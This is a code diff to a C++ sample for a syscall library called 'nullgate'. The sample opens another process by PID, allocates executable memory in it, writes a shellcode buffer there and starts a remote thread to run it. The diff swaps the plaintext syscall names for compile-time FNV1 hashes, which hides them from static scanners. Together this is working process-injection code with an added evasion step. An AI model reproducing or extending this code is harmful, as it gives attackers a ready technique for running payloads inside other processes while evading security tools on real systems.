@@ -1,5 +1,5 @@
-// #include <minwinbase.h>
 #include <ntdef.h>
+#include <nullgate/hashing.hpp>
 #include <nullgate/syscalls.hpp>
 #include <sample/ntapi.hpp>
 #include <stdexcept>
@@ -37,8 +37,9 @@ int main(int argc, char *argv[]) {
   HANDLE processHandle = NULL;
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
   CLIENT_ID clientId = {.UniqueProcess = (HANDLE)PID, .UniqueThread = NULL};
-  auto status = syscalls.Call("NtOpenProcess", &processHandle,
-                              PROCESS_ALL_ACCESS, objectAttrs, clientId);
+  auto status =
+      syscalls.Call(nullgate::fnv1Const("NtOpenProcess"), &processHandle,
+                    PROCESS_ALL_ACCESS, objectAttrs, clientId);
   if (!NT_SUCCESS(status))
     throw std::runtime_error(
         "Couldn't get a handle on the process, failed with: " +
@@ -46,38 +47,40 @@ int main(int argc, char *argv[]) {
 
   PVOID buf = NULL;
   size_t regionSize = sizeof(shellcode);
-  status = syscalls.Call("NtAllocateVirtualMemory", processHandle, &buf, 0,
-                         &regionSize, MEM_RESERVE | MEM_COMMIT,
-                         PAGE_EXECUTE_READWRITE);
+  status = syscalls.Call(nullgate::fnv1Const("NtAllocateVirtualMemory"),
+                         processHandle, &buf, 0, &regionSize,
+                         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call("NtClose", processHandle);
+    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
         "Couldn't get reserve memory in the process, failed with: " +
         std::to_string(status));
   }
 
-  status = syscalls.Call("NtWriteVirtualMemory", processHandle, buf,
-                         (void *)&shellcode, sizeof(shellcode), NULL);
+  status =
+      syscalls.Call(nullgate::fnv1Const("NtWriteVirtualMemory"), processHandle,
+                    buf, (void *)&shellcode, sizeof(shellcode), NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call("NtClose", processHandle);
+    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
         "Couldn't get write memory in to the process, failed with: " +
         std::to_string(status));
   }
 
   HANDLE threadHandle = NULL;
-  status =
-      syscalls.Call("NtCreateThreadEx", &threadHandle, THREAD_ALL_ACCESS,
-                    &objectAttrs, processHandle, buf, NULL, 0, 0, 0, 0, NULL);
+  status = syscalls.Call(nullgate::fnv1Const("NtCreateThreadEx"), &threadHandle,
+                         THREAD_ALL_ACCESS, &objectAttrs, processHandle, buf,
+                         NULL, 0, 0, 0, 0, NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call("NtClose", processHandle);
+    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
         "Couldn't get create handle in the the process, failed with: " +
         std::to_string(status));
   }
 
-  syscalls.Call("NtWaitForSingleObject", threadHandle, INFINITE);
+  syscalls.Call(nullgate::fnv1Const("NtWaitForSingleObject"), threadHandle,
+                INFINITE);
 
-  syscalls.Call("NtClose", threadHandle);
-  status = syscalls.Call("NtClose", processHandle);
+  syscalls.Call(nullgate::fnv1Const("NtClose"), threadHandle);
+  status = syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
 }
